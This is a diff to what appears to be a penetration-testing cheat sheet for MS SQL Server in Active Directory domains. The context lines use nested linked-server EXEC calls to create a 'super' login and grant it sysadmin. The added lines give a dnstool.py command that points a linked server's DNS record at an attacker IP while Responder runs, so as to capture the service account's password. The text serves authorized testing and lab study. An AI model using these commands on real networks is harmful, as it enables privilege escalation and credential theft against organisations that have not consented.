@@ -502,6 +502,14 @@ EXEC ('EXEC (''EXEC sp_addlogin ''''super'''', ''''super'''''') at [COMPATIBILIT
 EXEC ('EXEC (''EXEC sp_addsrvrolemember ''''super'''', ''''sysadmin'''''') at [COMPATIBILITY\POO_PUBLIC]') at [COMPATIBILITY\POO_CONFIG];
 ```
 
+- If there is a linked server, but you are getting error while connecting it. You can do DNS spoofing to get the service account's password:
+
+```shell
+# Turn on responder as well
+python3 dnstool.py -u $DOMAIN\\$USER -p $PASSWORD -dns-ip $DC_IP -a add -r $LINKED_SERVERNAME \
+  -t A -d $ATTACKER_IP $DC_FQDN
+```
+
 - Enumerating SQL server admins in domain:
 
 ```shell
